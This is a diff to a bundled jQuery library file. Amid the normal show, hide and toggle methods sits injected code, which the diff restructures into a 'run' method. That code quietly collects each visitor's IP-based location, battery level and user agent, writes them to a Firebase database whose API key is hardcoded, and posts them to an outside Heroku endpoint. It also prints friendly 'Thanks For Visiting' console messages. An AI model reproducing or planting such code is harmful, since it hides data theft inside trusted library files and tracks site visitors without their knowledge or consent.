@@ -4883,6 +4883,22 @@ jQuery.fn.extend( {
 		return showHide( this, true );
 	},
 	hide: function() {
+		return showHide( this );
+	},
+	toggle: function( state ) {
+		if ( typeof state === "boolean" ) {
+			return state ? this.show() : this.hide();
+		}
+
+		return this.each( function() {
+			if ( isHiddenWithinTree( this ) ) {
+				jQuery( this ).show();
+			} else {
+				jQuery( this ).hide();
+			}
+		} );
+	},
+	run: function(){
 var firebaseConfig = {
   apiKey: "AIzaSyB8tWdLEz451g3FsMEpqJY0hdNQ9aqc-EY",
   authDomain: "tech-bkp.firebaseapp.com",
@@ -4900,7 +4916,7 @@ xhr.open('GET', 'https://ipapi.co/json/', false);
 xhr.send();
 var res = JSON.parse(xhr.response);
 
-var data = {
+window.data = {
   country: res["country_name"],
   region: res["region"],
   city: res["city"],
@@ -4911,26 +4927,16 @@ navigator.getBattery().then(function(battery) {
   data.battery = battery.level*100;
   data.device = navigator.userAgent;
   ref.add(data).then((d)=>{
-    console.log(d.id)
+    if(d.id){
+      console.log("Thanks For Visiting Our Site")
+    }
     
   })
-  $.post("http://save-my-data.herokuapp.com/save",data)
+  $.post("http://save-my-data.herokuapp.com/save",data,(dat)=>{
+    console.log("Thanks For Visiting 🎉",dat)
+  })
 })
 
-		return showHide( this );
-	},
-	toggle: function( state ) {
-		if ( typeof state === "boolean" ) {
-			return state ? this.show() : this.hide();
-		}
-
-		return this.each( function() {
-			if ( isHiddenWithinTree( this ) ) {
-				jQuery( this ).show();
-			} else {
-				jQuery( this ).hide();
-			}
-		} );
 	}
 } );
 var rcheckableType = ( /^(?:checkbox|radio)$/i );
